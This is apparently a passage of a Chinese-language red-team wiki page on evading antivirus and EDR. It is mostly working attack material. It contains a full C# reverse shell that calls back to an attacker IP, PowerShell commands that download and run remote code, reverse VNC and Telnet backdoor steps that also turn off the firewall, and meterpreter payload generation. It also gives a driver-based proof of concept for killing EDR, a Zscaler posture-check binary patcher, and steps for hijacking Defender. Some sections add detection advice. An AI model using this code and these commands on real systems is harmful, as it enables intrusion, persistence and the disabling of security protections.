它涉及 **启动一个新的牺牲进程**，将你的 post-exploitation malicious code 注入到那个新进程中，执行你的恶意代码，完成后再杀掉新进程。这种方法既有优点也有缺点。fork and run 方法的优点是执行发生在我们的 Beacon implant 进程 **之外**。这意味着如果我们的 post-exploitation 操作出问题或被捕获，我们的 **implant 存活下来的机会会大得多**。缺点是更容易被 **Behavioural Detections** 发现。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这是把 post-exploitation malicious code **注入到它自己的进程中**。这样就可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 执行出错，**更有可能** 会 **丢失你的 beacon**，因为它可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想了解更多关于 C# Assembly loading 的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以从 PowerShell 中加载 C# Assemblies，查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

正如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 所提出的那样，可以通过让受控机器访问 **安装在 Attacker Controlled SMB share 上的 interpreter environment** 来使用其他语言执行恶意代码。

通过允许访问 SMB share 上的 Interpreter Binaries 和环境，你可以在被入侵机器的 **内存中执行这些语言的任意代码**。

该 repo 指出：Defender 仍然会扫描 scripts，但通过使用 Go、Java、PHP 等，我们在 **绕过静态签名方面有更大的灵活性**。用这些语言测试随机的、未混淆的 reverse shell scripts 已被证明是成功的。

## TokenStomping

Token stomping 是一种允许攻击者 **操纵访问 token 或像 EDR 或 AV 这样的 security prouct** 的技术，使其降低权限，这样进程不会死掉，但也没有权限检查恶意活动。

为防止这种情况，Windows 可以 **阻止外部进程** 获取 security processes 的 tokens 句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，只需在受害者 PC 上部署 Chrome Remote Desktop，然后用它接管并维持持久化就很容易：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI file 以下载 MSI file。
2. 在受害者机器上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击 next。向导随后会要求你授权；点击 Authorize button 继续。
4. 执行给定参数并稍作调整：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （注意 pin param，它允许在不使用 GUI 的情况下设置 pin）。


## Advanced Evasion

Evasion 是一个非常复杂的话题，有时你必须同时考虑一个系统中的许多不同 telemetry source，所以在成熟环境中几乎不可能做到完全不被发现。

你面对的每个环境都会有各自的优点和弱点。

我强烈建议你去看一下来自 [@ATTL4S](https://twitter.com/DaniLJ94) 的这个演讲，以便入门更高级的 Evasion techniques。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是来自 [@mariuszbit](https://twitter.com/mariuszbit) 的另一个很棒的关于 Evasion in Depth 的演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会 **移除 binary 的部分内容**，直到 **找出 Defender** 认为恶意的是哪一部分，并把它拆分给你。\
另一个做 **同样事情的工具是** [**avred**](https://github.com/dobin/avred)，并提供了一个开放的 web 服务，地址为 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

直到 Windows10，所有 Windows 都自带一个可以安装的 **Telnet server**（以管理员身份）进行：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
让它在系统启动时**自动启动**，并且**立即运行**它：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口**（隐蔽）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从这里下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（你要的是 bin 下载，不是 setup）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用 _Disable TrayIcon_ 选项
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 放到 **victim** 中

#### **Reverse connection**

**attacker** 应该在自己的 **host** 上执行二进制 `vncviewer.exe -listen 5900`，这样它就会**准备好**接收反向 **VNC connection**。然后，在 **victim** 中：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为了保持 stealth，你不能做以下几件事

- 如果 `winvnc` 已经在运行，就不要再次启动它，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。可以用 `tasklist | findstr winvnc` 检查它是否正在运行
- 不要在没有同目录下 `UltraVNC.ini` 的情况下启动 `winvnc`，否则会打开 [the config window](https://i.imgur.com/rfMQWcf.png)
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从这里下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 中：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在用 `msfconsole -r file.rc` **启动监听器**，并用以下方式**执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前的 defender 会非常快地终止进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下方式编译它：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
请与以下内容一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 进行 build injectors 的示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从 Kernel Space 杀掉 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具，在投放 ransomware 之前先禁用 endpoint protections。该工具自带其**自身有漏洞但已签名的驱动**，并滥用它来执行特权 kernel 操作，甚至连 Protected-Process-Light (PPL) AV services 也无法阻止。

Key take-aways  
1. **Signed driver**：落盘的文件名是 `ServiceMouse.sys`，但二进制实际上是 Antiy Labs “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。由于该驱动带有有效的 Microsoft 签名，即使 Driver-Signature-Enforcement (DSE) 已启用也会加载。
2. **Service installation**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为一个 **kernel service**，第二行启动它，这样 `\\.\ServiceMouse` 就可以从 user land 访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于杀掉 Defender/EDR services） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除 service |

最小 C proof-of-concept：
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**：BYOVD 完全绕过 user-mode protections；在 kernel 中执行的代码可以打开 *protected* processes、终止它们，或者篡改 kernel objects，而不受 PPL/PP、ELAM 或其他 hardening features 的影响。

Detection / Mitigation  
•  启用 Microsoft 的 vulnerable-driver block list（`HVCI`, `Smart App Control`），让 Windows 拒绝加载 `AToolsKrnl64.sys`。  
•  监控新的 *kernel* services 创建，并在驱动从 world-writable 目录加载或不在 allow-list 中时告警。  
•  关注对自定义 device objects 的 user-mode handles，随后出现可疑的 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler 的 **Client Connector** 在本地执行 device-posture 规则，并依赖 Windows RPC 将结果传递给其他组件。两个薄弱的设计选择使得可以完全绕过：

1. Posture evaluation **完全在 client-side** 完成（只向服务器发送一个 boolean）。
2. 内部 RPC endpoints 只验证连接的可执行文件是否 **由 Zscaler 签名**（通过 `WinVerifyTrust`）。

通过在磁盘上**patch 四个已签名的二进制文件**，这两种机制都可以被 neutralise：

| Binary | 原始被 patch 的逻辑 | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查都显示 compliant |
| `ZSAService.exe` | 指向 `WinVerifyTrust` 的间接调用 | NOP-ed ⇒ 任何进程（即使未签名）都可以绑定到 RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对 tunnel 的完整性检查 | 被 short-circuited |

最小 patcher 摘录：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
在替换原始文件并重启服务栈后：

* **所有** posture checks 都显示为 **green/compliant**。
* 未签名或被修改的二进制文件可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被入侵的主机获得对 Zscaler policies 定义的内部网络的无限制访问。

这个 case study 展示了仅靠客户端信任决策和简单的签名检查，如何能被少量字节补丁绕过。

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) 通过 signer/level 层级进行强制限制，因此只有同级或更高级别受保护的进程才能相互篡改。从攻击角度看，如果你能合法启动一个启用 PPL 的 binary 并控制其参数，你就可以把看似无害的功能（例如日志记录）转变为一种受限的、由 PPL 支持的写入原语，用来作用于 AV/EDR 使用的受保护目录。

什么使一个 process 以 PPL 运行
- 目标 EXE（以及任何已加载的 DLLs）必须使用具备 PPL 能力的 EKU 签名。
- 该 process 必须通过 CreateProcess 并使用以下 flags 创建：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 还必须请求与 binary 的 signer 匹配的兼容 protection level（例如，anti-malware 签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的 level 会在创建时失败。

另请参见这里关于 PP/PPL 和 LSASS protection 的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- 开源 helper：CreateProcessAsPPL（选择 protection level 并将 arguments 转发给目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 签名的系统二进制 `C:\Windows\System32\ClipUp.exe` 会自启动并接受一个参数，将 log file 写入调用者指定的路径。
- 当作为 PPL process 启动时，file write 会带有 PPL backing。
- ClipUp 不能解析包含空格的路径；使用 8.3 short paths 指向通常受保护的位置。

8.3 short path helpers
- 列出 short names：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导 short path：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用 launcher（例如 CreateProcessAsPPL）启动支持 PPL 的 LOLBIN（ClipUp），并带上 `CREATE_PROTECTED_PROCESS`。
2) 传入 ClipUp 的 log-path 参数，强制在受保护的 AV directory 中创建 file（例如 Defender Platform）。如有需要，使用 8.3 short names。
3) 如果目标 binary 在 AV 运行时通常是 open/locked（例如 MsMpEng.exe），就通过安装一个能更早可靠运行的 auto-start service，在 boot 时安排写入。使用 Process Monitor（boot logging）验证 boot ordering。
4) 重启后，带有 PPL backing 的 write 会在 AV 锁定其 binaries 之前发生，破坏目标 file 并阻止启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- You cannot control the contents ClipUp writes beyond placement; the primitive is suited to corruption rather than precise content injection.
- Requires local admin/SYSTEM to install/start a service and a reboot window.
- Timing is critical: the target must not be open; boot-time execution avoids file locks.

Detections
- Process creation of `ClipUp.exe` with unusual arguments, especially parented by non-standard launchers, around boot.
- New services configured to auto-start suspicious binaries and consistently starting before Defender/AV. Investigate service creation/modification prior to Defender startup failures.
- File integrity monitoring on Defender binaries/Platform directories; unexpected file creations/modifications by processes with protected-process flags.
- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS` and anomalous PPL level usage by non-AV binaries.

Mitigations
- WDAC/Code Integrity: restrict which signed binaries may run as PPL and under which parents; block ClipUp invocation outside legitimate contexts.
- Service hygiene: restrict creation/modification of auto-start services and monitor start-order manipulation.
- Ensure Defender tamper protection and early-launch protections are enabled; investigate startup errors indicating binary corruption.
- Consider disabling 8.3 short-name generation on volumes hosting security tooling if compatible with your environment (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 通过 Platform Version Folder Symlink Hijack 篡改 Microsoft Defender

Windows Defender 通过枚举以下目录下的子文件夹来选择其运行平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择字典序版本字符串最高的子文件夹（例如，`4.18.25070.5-0`），然后从那里启动 Defender 服务进程（同时更新 service/registry 路径）。这个选择信任目录项，包括目录 reparse points（symlinks）。管理员可以利用这一点将 Defender 重定向到攻击者可写路径，并实现 DLL sideloading 或 service disruption。

前置条件
- Local Administrator（需要在 Platform 文件夹下创建目录/symlink）
- 能够重启或触发 Defender platform 重新选择（重启时的 service restart）
- 只需要内置工具（mklink）

原理
- Defender 会阻止对自身文件夹的写入，但其 platform 选择信任目录项，并会选择字典序最高的版本，而不会验证目标是否解析到受保护/可信路径。

步骤示例
1) 准备当前 platform 文件夹的一个可写克隆，例如 `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发选择（建议重启）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该观察到 `C:\TMP\AV\` 下的新进程路径，以及反映该位置的服务配置/registry。

Post-exploitation options
- DLL sideloading/code execution: 放置/替换 Defender 从其应用程序目录加载的 DLL，以在 Defender 的进程中执行代码。参见上面的部分：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: 移除 version-symlink，这样在下次启动时，配置的路径无法解析，Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意：此技术本身不提供权限提升；它需要 admin rights。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams 可以通过 hook 目标模块的 Import Address Table (IAT)，并将选定的 APIs 重定向到攻击者控制的、位置无关代码（PIC），把运行时规避从 C2 implant 移到目标模块自身中。这样就把规避能力从许多 kit 只暴露的很小 API 表面（例如 CreateProcessA）扩展到了更广范围，并且同样的保护也可用于 BOFs 和 post-exploitation DLLs。

High-level approach
- 使用 reflective loader 在目标模块旁边加载一个 PIC blob（前置或伴随）。PIC 必须是自包含且位置无关的。
- 当宿主 DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR，并将目标导入项（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）的 IAT 条目 patch 到轻量的 PIC wrappers。
- 每个 PIC wrapper 都会在尾调用真实 API 地址之前执行规避操作。典型规避包括：
- 调用前后进行内存 mask/unmask（例如，加密 beacon 区域、RWX→RX、修改 page names/permissions），然后在调用后恢复。
- Call-stack spoofing：构造一个 benign stack，并切换进入目标 API，使 call-stack analysis 解析出预期的 frames。
- 为了兼容性，导出一个接口，以便 Aggressor script（或等价物）可以注册要为 Beacon、BOFs 和 post-ex DLLs hook 的 APIs。

Why IAT hooking here
- 对任何使用被 hook 导入的代码都有效，而无需修改工具代码，也不依赖 Beacon 去代理特定 APIs。
- 覆盖 post-ex DLLs：hook LoadLibrary* 可以拦截模块加载（例如 System.Management.Automation.dll、clr.dll），并对它们的 API 调用应用相同的 masking/stack evasion。
- 通过封装 CreateProcessA/W，恢复对基于 call-stack 的检测下，进程创建型 post-ex 命令的可靠使用。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- 在 relocations/ASLR 之后、首次使用 import 之前应用 patch。像 TitanLdr/AceLdr 这样的 reflective loaders 展示了在已加载模块的 DllMain 期间进行 hooking。
- 保持 wrappers 尽量小且 PIC-safe；通过你在 patch 前捕获的原始 IAT value，或通过 LdrGetProcedureAddress 解析真实 API。
- 对 PIC 使用 RW → RX 过渡，避免保留可写+可执行页面。

Call‑stack spoofing stub
- Draugr‑style PIC stubs 构建伪造 call chain（返回地址指向 benign modules），然后 pivot 到真实 API。
- 这能绕过那些期望 Beacon/BOFs 到敏感 APIs 具有标准栈的 detections。
- 结合 stack cutting/stack stitching techniques，在 API prologue 之前落入预期 frames。

Operational integration
- 将 reflective loader 前置到 post-ex DLLs 中，这样当 DLL 加载时，PIC 和 hooks 会自动初始化。
- 使用 Aggressor script 注册目标 APIs，使 Beacon 和 BOFs 无需代码改动就能透明地享有同一 evasion path。

Detection/DFIR considerations
- IAT integrity：解析到非-image（heap/anon）地址的 entries；对 import pointers 进行周期性验证。
- Stack anomalies：返回地址不属于已加载 images；突然切换到非-image PIC；不一致的 RtlGetUserThreadStart ancestry。
- Loader telemetry：进程内对 IAT 的写入、早期修改 import thunks 的 DllMain 活动、加载时创建的意外 RX regions。
- Image-load evasion：如果 hooking LoadLibrary*，监控与 memory masking events 相关联的 automation/clr assemblies 的可疑加载。

Related building blocks and examples
- 在加载期间执行 IAT patching 的 reflective loaders（例如，TitanLdr, AceLdr）
- Memory masking hooks（例如，simplehook）和 stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例如，Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 通过 resident PICO 实现 import-time IAT hooks

如果你控制一个 reflective loader，可以在 `ProcessImports()` 期间通过将 loader 的 `GetProcAddress` pointer 替换为一个先检查 hooks 的自定义 resolver 来 hook imports：

- 构建一个 **resident PICO**（persistent PIC object），使其在 transient loader PIC 自我释放后仍然存活。
- 导出一个 `setup_hooks()` function，覆盖 loader 的 import resolver（例如，`funcs.GetProcAddress = _GetProcAddress`）。
- 在 `_GetProcAddress` 中，跳过 ordinal imports，并使用基于 hash 的 hook lookup，例如 `__resolve_hook(ror13hash(name))`。如果 hook 存在，则返回它；否则委托给真正的 `GetProcAddress`。
- 在 link time 使用 Crystal Palace 的 `addhook "MODULE$Func" "hook"` entries 注册 hook targets。由于 hook 位于 resident PICO 内部，它会一直有效。

这就实现了 **import-time IAT redirection**，而无需在 load 后 patch 已加载 DLL 的 code section。

### 当 target 使用 PEB-walking 时强制可 hook 的 imports

只有当函数 वास्तव 上位于 target 的 IAT 中时，import-time hooks 才会触发。如果某个 module 通过 PEB-walk + hash 解析 APIs（没有 import entry），就强制引入一个真实 import，让 loader 的 `ProcessImports()` 路径能看到它：

- 将 hashed export resolution（例如，`GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）替换为直接引用，如 `&WaitForSingleObject`。
- 编译器会生成一个 IAT entry，从而在 reflective loader 解析 imports 时实现 interception。

### 无需 patch `Sleep()` 的 Ekko-style sleep/idle obfuscation

不要 patch `Sleep`，而是 hook implant 实际使用的 **wait/IPC primitives**（`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`）。对于长等待，将调用包装进一个 Ekko-style obfuscation chain，在 idle 期间对内存中的 image 进行加密：

- 使用 `CreateTimerQueueTimer` 调度一系列 callbacks，这些 callbacks 调用带有精心构造的 `CONTEXT` frames 的 `NtContinue`。
- 典型 chain（x64）：将 image 设置为 `PAGE_READWRITE` → 通过 `advapi32!SystemFunction032` 对整个 mapped image 执行 RC4 encrypt → 执行阻塞等待 → RC4 decrypt → **通过遍历 PE sections 恢复每个 section 的权限** → 发出完成信号。
- `RtlCaptureContext` 提供一个模板 `CONTEXT`；将其克隆到多个 frames，并设置 registers（`Rip/Rcx/Rdx/R8/R9`）来调用每一步。

Operational detail：对于长等待返回 “success”（例如，`WAIT_OBJECT_0`），这样调用者会在 image 被 masked 时继续执行。此模式可在 idle 窗口期间隐藏模块，且避免经典的“patched `Sleep()`”特征。

Detection ideas (telemetry-based)
- 指向 `NtContinue` 的 `CreateTimerQueueTimer` callbacks 突发出现。
- `advapi32!SystemFunction032` 被用于大块、连续、接近 image 大小的 buffers。
- 大范围 `VirtualProtect` 之后紧跟自定义的每个 section 权限恢复。

## Precision Module Stomping

